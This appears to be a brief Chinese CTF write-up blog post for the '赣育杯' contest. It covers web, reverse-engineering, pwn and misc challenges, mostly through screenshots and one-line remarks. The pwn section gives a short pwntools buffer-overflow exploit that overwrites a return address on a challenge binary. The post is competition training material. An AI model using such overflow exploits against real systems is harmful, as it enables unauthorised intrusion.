---
title: 赣育杯wp
date: 2024-10-27 07:36:55
updated: 2024-10-27 07:48:55
tags:
  - WriteUp
  - CTF
---
# WEB

## XXEXXE

![QQ_1730014684259.png](https://cdn.nlark.com/yuque/0/2024/png/39170111/1730014694300-f02f14c0-1137-4942-89a6-6103575793e5.png)![QQ_1730014711411.png](https://cdn.nlark.com/yuque/0/2024/png/39170111/1730014714745-aaaddd50-e557-4930-805a-cc608b98e6ec.png)

## ReadFlag

![b4c02bf7fe461acf43f01944c1eca21d.png](https://cdn.nlark.com/yuque/0/2024/png/39170111/1730014819751-ceb84dfa-7830-4f89-a144-9b3135af9741.png)

![7f49b0d2853436d5020d6bf3f4a7fc13.png](https://cdn.nlark.com/yuque/0/2024/png/39170111/1730014801886-5a6012ca-cdc2-4e49-99f4-e5b2526e645b.png)

下下来一个pdf，cat就行

# RE

## 勒索病毒

![image.png](https://cdn.nlark.com/yuque/0/2024/png/39170111/1730015331233-d7434e37-0200-47b0-9c2b-1cc9bca926da.png)

# PWN

## OF

```python
from pwn import *
context(os = 'linux',arch = 'i386',log_level = 'debug')	

#p = remote('ctfx.edu.sangfor.com.cn', 40902)
p = process('./of')	
elf = ELF('./of')	

payload = b'a' * 0x4A + b'b' * 4
payload += p32(0x11c9) + p32(0xC8E51295)

p.sendline(payload)
p.interactive()
```

# MISC

## Areurobot?（docker）

根据题目回答问题，手速要快

![76f76cd5d697afaf563a4fb0f3a68d46_720.png](https://cdn.nlark.com/yuque/0/2024/png/39170111/1730015081712-02e11f64-ac7d-4c87-bbd7-9a25c453678d.png)